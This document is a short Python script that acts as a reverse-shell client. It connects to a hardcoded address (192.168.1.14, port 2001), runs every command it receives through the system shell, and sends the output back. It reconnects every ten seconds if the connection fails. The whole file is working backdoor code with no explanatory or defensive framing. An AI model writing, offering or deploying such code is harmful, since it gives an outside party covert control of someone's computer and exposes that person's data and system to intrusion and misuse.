from socket import socket,AF_INET,SOCK_STREAM
import subprocess
import time
def claint():
    end="<end>"
    s_conect = ("192.168.1.14",2001)
    while True:
        try:
            c_socket=socket(AF_INET,SOCK_STREAM)
            print("connecting to server")
            c_socket.connect(s_conect)
            while True:
                f_command = c_socket.recv(1024)
                command = f_command.decode()
                if command.lower() == "exit":
                    c_socket.close()
                    break
                elif command == "":
                    continue
                else:
                    output=subprocess.run(command,shell=True,capture_output=True)
                    if output.stderr.decode("utf-8") =="":
                        result=output.stdout
                        result=result.decode("utf-8") + end
                        result=result.encode("utf-8")
                    elif output.stderr.decode("utf-8")!="":
                        result=output.stderr
                        result=result.decode("utf-8") +  end
                        result=result.encode("utf-8")
                c_socket.sendall(result)
        except Exception:
            print("can't connect !!!")
            time.sleep(10) 
claint()